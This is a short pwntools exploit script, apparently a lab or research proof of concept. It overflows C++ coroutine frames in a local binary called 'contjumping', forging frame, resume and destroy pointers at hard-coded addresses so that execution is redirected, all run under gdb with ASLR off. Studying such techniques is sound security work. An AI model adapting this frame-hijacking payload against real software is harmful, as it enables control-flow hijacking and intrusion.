from pwn import *

context.update(arch='x86_64', os='linux')
context.aslr = False
binary = ELF('./contjumping')
context.binary = binary
#context.terminal = ['bash', '-e']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = gdb.debug('./contjumping', '''
    b main
    b c3
    c        
''')

VULN_PTR = 0x000055555556c6c0
C1_FRAME_PTR = 0x000055555556c6e0
C2_FRAME_PTR = 0x000055555556cb30
C3_FRAME_PTR = 0x000055555556cb70
C4_FRAME_PTR = 0x000055555556cbb0
C5_FRAME_PTR = 0x000055555556cbb0
C1_FRAME_RESUME_PTR = 0x555555555eb0
C2_FRAME_RESUME_PTR = 0x555555555cb0
C3_FRAME_RESUME_PTR = 0x555555555ab0
C4_FRAME_RESUME_PTR = 0x5555555558b0
C5_FRAME_RESUME_PTR = 0x555555555790
C1_FRAME_DESTROY_PTR = 0x555555556080
C2_FRAME_DESTROY_PTR = 0x555555555e80
C3_FRAME_DESTROY_PTR = 0x555555555c80
C4_FRAME_DESTROY_PTR = 0x5555555558a0
C5_FRAME_DESTROY_PTR = 0x5555555558a0

FORGED_C4_FRAME_PTR = 0x000055555556c740
FORGED_C5_FRAME_PTR = 0x55555556c7a0
AFUNCTION_PTR = 0x5555555552d0
FORGET_FAKE_AFUNCTION_FRAME = 0x55555556c7c0

initial_overflow_payload = b'A'*0x20

overwrite_payload_1 = \
    pack(C2_FRAME_RESUME_PTR) + pack(AFUNCTION_PTR)+\
    pack(0x0) + pack(0x0) +\
    pack(FORGED_C4_FRAME_PTR) + b'B'*0x8 +\
    b'C'*0x30 +\
    pack(C4_FRAME_RESUME_PTR) + pack(AFUNCTION_PTR) +\
    pack(0x0) + pack(0x0) +\
    pack(FORGED_C5_FRAME_PTR) + b'B'*0x8 +\
    b'C'*0x30 +\
    pack(C5_FRAME_RESUME_PTR) + pack(AFUNCTION_PTR) +\
    pack(FORGET_FAKE_AFUNCTION_FRAME) + pack(0x0)+\
    pack(AFUNCTION_PTR) + b'B'*0x8 +\
    b'C'*0x30


p.recvuntil("starting coros\n")
payload = initial_overflow_payload + overwrite_payload_1
#payload = payload_class_data
log.info("Overflowing coroutine frames... payload size: "+str(len(payload)))
p.sendline(payload)

print(payload)


p.interactive()
